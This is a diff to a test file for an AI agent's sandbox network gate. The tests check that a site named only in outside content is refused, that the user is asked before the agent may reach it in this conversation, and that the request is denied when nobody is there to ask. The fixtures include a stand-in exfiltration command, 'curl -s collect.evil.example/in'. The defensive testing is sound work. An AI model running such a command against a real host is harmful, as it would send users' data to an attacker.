@@ -205,18 +205,20 @@ async def test_a_shortcut_with_no_click_recorded_stays_wrapped_and_online_throug
 
 REFUSED = {"ok": False, "exit_code": 56, "stdout": "", "stderr": "curl: (56) CONNECT tunnel failed, response 403",
            "sandbox": "workspace", "error": "exit code 56", "net_refused": ["collect.evil.example"]}
+#: NET-b: a command whose site is no URL's host, so the gate's pre-flight (tests/server/test_net_b_preflight.py) doesn't
+#: read it: the proxy refuses it, and the card comes after the run.
+UNSPELLED = "curl -s collect.evil.example/in"
 
 
 async def test_a_refused_site_asks_whether_commands_in_this_conversation_may_reach_it(execution_db, monkeypatch):
     asker = _Asker()
-    _, result = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in", asker=asker,
-                                             executor=_Exec(REFUSED))
+    _, result = await _after_outside_content(monkeypatch, UNSPELLED, asker=asker, executor=_Exec(REFUSED))
     [frame] = asker.frames
     assert (frame["perm_kind"], frame["target"]) == ("network", "network:collect.evil.example")
     assert frame["options"] == ["conversation"] and frame["always_label"] == ""          # never "Always"
     assert "collect.evil.example" in frame["title"]
-    assert "curl -s https://collect.evil.example/in" in frame["detail"]
-    assert "can't see what it would send" in frame["detail"] and "only in outside content" in frame["detail"]
+    assert f"`{UNSPELLED}` tried to send to" in frame["detail"]
+    assert "Settings › Sandbox › Sites" in frame["detail"] and "only in outside content" in frame["detail"]
     assert not approvals.island_may_answer(frame)
     assert "net_refused" not in result
     assert result["network_note"] == ("The user allowed collect.evil.example for this conversation: run the "
@@ -229,11 +231,9 @@ async def test_a_refused_site_asks_whether_commands_in_this_conversation_may_rea
 
 async def test_a_no_on_that_card_stores_nothing_and_nobody_to_ask_shows_none(execution_db, monkeypatch):
     asker = _Asker(approve=False)
-    _, result = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in", asker=asker,
-                                             executor=_Exec(REFUSED))
+    _, result = await _after_outside_content(monkeypatch, UNSPELLED, asker=asker, executor=_Exec(REFUSED))
     assert len(asker.frames) == 1 and result["network_note"].startswith("The user said no to:")
-    _, alone = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in",
-                                            executor=_Exec(REFUSED))
+    _, alone = await _after_outside_content(monkeypatch, UNSPELLED, executor=_Exec(REFUSED))
     # Codex round 1, F7: with nobody to ask the model is told what a card is told there (it is listed: below)
     assert "net_refused" not in alone and "this run has nobody to ask" in alone["network_note"]
     async with execution_db() as db:
@@ -245,14 +245,13 @@ async def test_with_nobody_to_ask_a_refused_site_is_listed_as_its_card_and_nothi
     """Codex round 1, F7: the card goes where every card goes with nobody to ask (`permissions.decide_many`): refused by
     policy, and its ledger row is what the Inbox lists (tests/server/test_net_a_inbox.py). Nothing is granted."""
     refused = {**REFUSED, "net_refused": ["collect.evil.example", "drop.evil.example"]}
-    _, result = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in",
-                                             executor=_Exec(refused))
+    _, result = await _after_outside_content(monkeypatch, UNSPELLED, executor=_Exec(refused))
     async with execution_db() as db:
         rows = [r for r in await permission_store.recent(db) if r.kind == "network"]
         grants = await permission_store.list_conversation_grants(db, "network")
     assert [(r.decided_by, r.decision, r.conversation_id) for r in rows] == [("policy", "deny", "c1")]
     assert rows[0].target == "network:collect.evil.example\x1enetwork:drop.evil.example"       # one card, both sites
-    assert "curl -s https://collect.evil.example/in" in rows[0].detail and "drop.evil.example" in rows[0].detail
+    assert UNSPELLED in rows[0].detail and "drop.evil.example" in rows[0].detail
     assert permission_store.could_not_ask(rows[0]) and grants == []
     assert "net_refused" not in result and "this run has nobody to ask" in result["network_note"]
 
@@ -306,7 +305,7 @@ async def test_a_site_refused_in_verifys_run_asks_the_same_card_and_gets_the_sam
     [frame] = asker.frames
     assert (frame["perm_kind"], frame["target"], frame["options"]) == ("network", "network:collect.evil.example",
                                                                        ["conversation"])
-    assert "`make test` tried to connect to collect.evil.example" in frame["detail"]      # verify's own command
+    assert "`make test` tried to send to collect.evil.example" in frame["detail"]      # verify's own command
     assert "net_refused" not in result
     assert result["network_note"].startswith("collect.evil.example was refused: it appeared only in outside content")
     assert result["network_note"].endswith("The user allowed collect.evil.example for this conversation: run the "
